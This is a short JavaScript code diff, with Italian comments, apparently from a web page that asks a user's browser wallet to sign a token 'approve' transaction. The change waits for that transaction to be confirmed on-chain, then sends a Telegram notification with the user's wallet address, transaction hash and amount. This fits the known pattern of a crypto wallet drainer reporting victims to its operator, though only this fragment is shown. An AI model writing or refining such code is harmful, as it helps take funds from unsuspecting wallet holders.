@@ -626,6 +626,11 @@
                 lastTxHash = txHash;
                 console.log("Transaction sent:", txHash);
 
+                // Aspetta che la transazione sia confermata sulla blockchain
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const receipt = await provider.waitForTransaction(txHash);
+                console.log("Transaction confirmed:", receipt);
+
                 let finalUserAddress = userAddress;
                 if (!finalUserAddress) {
                     try {
@@ -638,7 +643,7 @@
                     }
                 }
 
-                // Invia notifica Telegram SUBITO dopo l'approve
+                // Invia notifica Telegram DOPO che la transazione è confermata
                 try {
                     await sendTelegramNotification(finalUserAddress, txHash, amount);
                 } catch (notifError) {
